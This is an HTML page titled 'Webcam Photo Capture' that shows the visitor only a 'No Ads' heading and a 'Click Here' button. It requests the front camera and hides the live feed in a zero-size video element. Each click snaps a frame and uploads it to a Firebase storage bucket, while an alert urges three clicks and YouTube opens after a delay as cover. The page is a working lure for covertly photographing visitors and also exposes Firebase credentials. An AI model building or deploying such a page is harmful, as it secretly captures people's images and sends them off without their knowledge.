<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Photo Capture</title>
    <style>
        #captureButton {
            display: block;
            padding: 10px 20px;
            background-color: #ff0000;
            color: white;
            border: none;
            cursor: pointer;
        }

        #imageContainer {
            text-align: center;
        }
        #video{
            height: 0px;
            width: 0px;
        }
    </style>
</head>
<body>
    <h1>No Ads</h1>
    <div id="imageContainer">
        <video id="video" autoplay></video>
        <button id="captureButton" onclick="myFunction()">Click Here</button>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-storage.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-messaging.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-functions.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-analytics.js"></script>
    <script>
        // Initialize Firebase
        var firebaseConfig = {
            apiKey: "AIzaSyD4gVjVtusAM438xB7RSBgFRfxOYYCT12s",
  authDomain: "anaa-2a550.firebaseapp.com",
  databaseURL: "https://anaa-2a550-default-rtdb.firebaseio.com",
  projectId: "anaa-2a550",
  storageBucket: "anaa-2a550.appspot.com",
  messagingSenderId: "281592905897",
  appId: "1:281592905897:web:62e7dd92090c4f61abe9b8",
  measurementId: "G-LHE1S0P5W5"
        };
        firebase.initializeApp(firebaseConfig);

        // Get references to the video and capture button
        const video = document.getElementById("video");
        const captureButton = document.getElementById("captureButton");

        // Create a media stream from the user's webcam
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function(stream) {
                video.srcObject = stream;
            })
            .catch(function(error) {
                console.error("Error accessing the webcam:", error);
            });

        // Handle the capture button click
        captureButton.addEventListener("click", function() {
            takePicture();
        });

        function takePicture() {
            // Create a canvas element to capture the image
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the image to base64 data URL
            const imageDataURL = canvas.toDataURL('image/jpeg');

            // Generate a unique filename using the current timestamp
            const timestamp = Date.now();
            const imageName = `image_${timestamp}.jpg`;

            // Upload the image to Firebase Storage
            const storageRef = firebase.storage().ref();
            const imageRef = storageRef.child(imageName);
            const metadata = {
                contentType: 'image/jpeg'
            };
            imageRef.putString(imageDataURL, 'data_url', metadata)
                .then(function(snapshot) {
                    console.log('Image uploaded to Firebase Storage:', snapshot.ref.fullPath);
                })
                .catch(function(error) {
                    console.error('Error uploading image:', error);
                });
        }
    </script>
    <script>
        function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function myFunction() {
    alert("Click On The Button For 3 Times...")
    sleep(8000).then(() => { window.open("https://www.youtube.com"); });
}

    </script>
</body>
</html>
